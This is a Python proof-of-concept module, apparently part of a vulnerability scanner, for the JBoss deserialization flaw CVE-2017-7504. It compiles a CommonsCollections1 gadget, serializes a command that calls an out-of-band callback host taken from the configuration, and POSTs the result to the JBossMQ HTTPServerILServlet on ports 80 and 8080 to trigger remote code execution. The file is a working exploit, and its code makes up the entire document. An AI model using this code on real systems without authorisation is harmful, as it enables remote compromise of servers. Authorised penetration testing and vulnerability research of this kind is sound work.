import os
import threading
import requests
import lib.config.config as config
from lib.core.monitor import port_monitor,page_monitor

def get_ser(url):

    return generate_ser(url)

def generate_ser(url):
    tool_dir = "./data/tools/jboss/cve-2017-7504-12149/"

    if not os.path.exists(tool_dir+'ExampleCommonsCollections1WithHashMap.class'):
        os.system("cd {};javac -cp .:commons-collections-3.2.1.jar ./ExampleCommonsCollections1WithHashMap.java".format(tool_dir))
    if (not os.path.exists(tool_dir+'ExampleCommonsCollections1WithHashMap.ser')) or config.repeat_poc:
        if config.method!='ping':
            cmd = "{} {}/{}".format(config.method,config.ceye_path,url)
        else:
            cmd = "{} {}.{} -c 4".format(config.method,url,config.ceye_path)
        info = os.popen('cd {};java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "{}"'.format(tool_dir, cmd))
        if not info.read().startswith('Saving serialized'):
            print(info.read(),"May be you should try on linux!!!!")
    
    with open(tool_dir+'ExampleCommonsCollections1WithHashMap.ser','rb') as f:
        return f.read()

def poc(url):
    poc_type = 'jboss:2017-7504'

    ports = ['80','8080']

    port_info = {}

    port_info,ports = port_monitor(url, poc_type, ports)

    page_info,ports = page_monitor(url, '/jbossmq-httpil/HTTPServerILServlet', poc_type, ports)
    port_info.update(page_info)

    for port in ports:
        try:
            s = requests.post('http://{}:{}/jbossmq-httpil/HTTPServerILServlet'.format(url,port),data = get_ser(url))
        except Exception as e:
            port_info[port] = [0,poc_type,'Conect failed']
            print(e)
        else:
            if "java-serialized-object" in s.headers['Content-Type']:
                port_info[port] = [1,poc_type,'Page exist']
            else:
                port_info[port] = [0,poc_type,'Not work']

    return port_info

#利用工具https://github.com/joaomatosf/JavaDeserH2HC